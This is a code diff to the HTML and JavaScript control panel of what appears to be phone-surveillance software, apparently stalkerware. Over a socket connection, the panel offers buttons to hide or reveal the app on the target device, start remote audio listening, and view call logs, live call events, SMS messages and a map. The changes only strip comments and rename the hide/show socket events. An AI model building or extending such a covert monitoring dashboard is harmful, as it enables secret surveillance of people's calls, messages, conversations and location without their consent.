@@ -51,7 +51,6 @@
       margin-top: 5px;
       font-style: italic;
     }
-    /* Table styling */
     table {
       width: 100%;
       margin-top: 15px;
@@ -73,7 +72,6 @@
     tr:nth-child(even) {
       background: #f9f9f9;
     }
-    /* Event list styling */
     .eventList {
       margin-top: 15px;
       padding: 10px;
@@ -103,7 +101,6 @@
 
   <div id="status">🔴 Disconnected</div>
 
-  <!-- New Control Buttons -->
   <div class="control-buttons">
     <button id="hideApp">👻 Hide App</button>
     <button id="showApp">📲 Show App</button>
@@ -116,7 +113,6 @@
   <button id="startAudio">▶ Start Listening</button>
   <p id="audioStatus">Click the button to start audio.</p>
 
-  <!-- Call Logs Section -->
   <h2>📋 Call Logs</h2>
   <table id="callLogsTable">
     <thead>
@@ -132,13 +128,11 @@
     </tbody>
   </table>
 
-  <!-- Real-time Call Events -->
   <h2>📞 Real-time Call Events</h2>
   <div id="callEventsList" class="eventList">
     <div>Waiting for call events...</div>
   </div>
 
-  <!-- Real-time SMS Messages -->
   <h2>📨 Real-time SMS Messages</h2>
   <div id="smsList" class="eventList">
     <div>Waiting for SMS messages...</div>
@@ -161,15 +155,15 @@
       statusDiv.style.color = "red";
     });
 
-    // === CONTROL BUTTONS ===
+    // === CONTROL BUTTONS FOR HIDE/SHOW APP ===
     document.getElementById("hideApp").addEventListener("click", () => {
-      socket.emit("hide-app");
-      console.log("👻 Hide App command sent");
+      socket.emit("hide-app-server");
+      console.log("👻 Hide App command sent to server");
     });
 
     document.getElementById("showApp").addEventListener("click", () => {
-      socket.emit("show-app");
-      console.log("📲 Show App command sent");
+      socket.emit("show-app-server");
+      console.log("📲 Show App command sent to server");
     });
 
     // === MAP ===
